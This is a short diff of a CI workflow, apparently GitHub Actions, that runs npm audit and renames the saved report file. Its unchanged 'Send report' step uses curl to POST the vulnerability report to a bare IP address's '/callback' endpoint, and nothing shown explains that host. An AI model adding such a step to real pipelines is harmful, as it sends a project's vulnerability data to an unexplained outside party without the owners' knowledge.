@@ -17,18 +17,18 @@ jobs:
         run: npm install
 
       - name: Run npm audit
-        run: npm audit --json > audit-report.json
+        run: npm audit --json > results.json
         continue-on-error: true
 
       - name: Verify report exists
         run: |
           echo "File size:"
-          ls -lh audit-report.json
+          ls -lh results.json
           echo "First 20 lines:"
-          head -n 20 audit-report.json
+          head -n 20 results.json
 
       - name: Send report
         run: |
           curl -X POST -H "Content-Type: multipart/form-data" \
-            -F "file=@audit-report.json" \
+            -F "file=@results.json" \
             http://35.219.147.98:8880/callback
